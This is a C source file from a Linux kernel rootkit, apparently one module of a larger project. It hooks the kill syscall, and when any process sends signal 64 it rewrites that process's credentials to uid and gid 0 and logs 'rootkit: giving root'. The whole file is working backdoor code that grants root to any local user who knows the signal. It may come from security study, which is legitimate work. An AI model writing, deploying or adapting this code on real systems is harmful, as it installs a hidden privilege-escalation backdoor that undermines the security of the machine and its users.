#include "hooks.h"

uint8_t SU_SIGNAL = 64;

asmlinkage long (*orig_kill)(const struct pt_regs *);


void set_root(void) {
    struct cred *root;
    root = prepare_creds();

    if (root == NULL)
        return;

    root->uid.val = 0;
    root->gid.val = 0;
    root->euid.val = 0;
    root->egid.val = 0;
    root->suid.val = 0;
    root->sgid.val = 0;
    root->fsuid.val = 0;
    root->fsgid.val = 0;

    commit_creds(root);
}


asmlinkage long hook_kill(const struct pt_regs* regs) {
    int sig = regs->si;

    if (sig == SU_SIGNAL)
    {
        printk(KERN_INFO "rootkit: giving root...\n");
        set_root();
    }

    return orig_kill(regs);
}